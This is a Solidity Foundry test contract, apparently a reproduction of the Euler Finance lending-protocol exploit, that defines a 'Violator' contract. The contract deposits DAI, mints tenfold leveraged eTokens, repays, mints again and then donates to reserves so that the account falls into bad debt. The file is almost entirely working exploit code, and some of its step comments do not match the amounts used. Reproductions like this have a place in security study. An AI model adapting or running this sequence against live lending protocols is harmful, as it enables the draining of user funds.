// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import { IERC20 } from "forge-std/src/interfaces/IERC20.sol";
import { IEToken } from "./interface/IEToken.sol";
import { IDToken } from "./interface/IDToken.sol";
import { ILiquidation } from "./interface/ILiquidation.sol";

import "forge-std/src/Test.sol";

contract Violator {
    IERC20 immutable DAI;
    IEToken immutable eDAI;
    IDToken immutable dDAI;
    address immutable EULER;

    constructor(IERC20 _dai, IEToken _eDAI, IDToken _dDAI, address _euler) {
        DAI = _dai;
        eDAI = _eDAI;
        dDAI = _dDAI;
        EULER = _euler;
    }

    function violate() external {
        // for safeTransferFrom in deposit
        DAI.approve(EULER, type(uint256).max);
        // 3. Deposit 30M DAI 
        eDAI.deposit(0, 20_000_000 * 1e18);
        // log: balance, total balance, interest rate
        console.logInt(eDAI.getInterestRate(address(eDAI)));

        // 4. Borrow (mint) 10 x deposit
        eDAI.mint(0, 200_000_000 * 1e18);
        // 4. Repay 10M DAI
        dDAI.repay(0, 10_000_000 * 1e18);
        // 5. Mint 10 x deposit again
        eDAI.mint(0, 200_000_000 * 1e18);
        // 6. Donate 100M DAI
        eDAI.donateToReserves(0, 100_000_000 * 1e18);
    }
}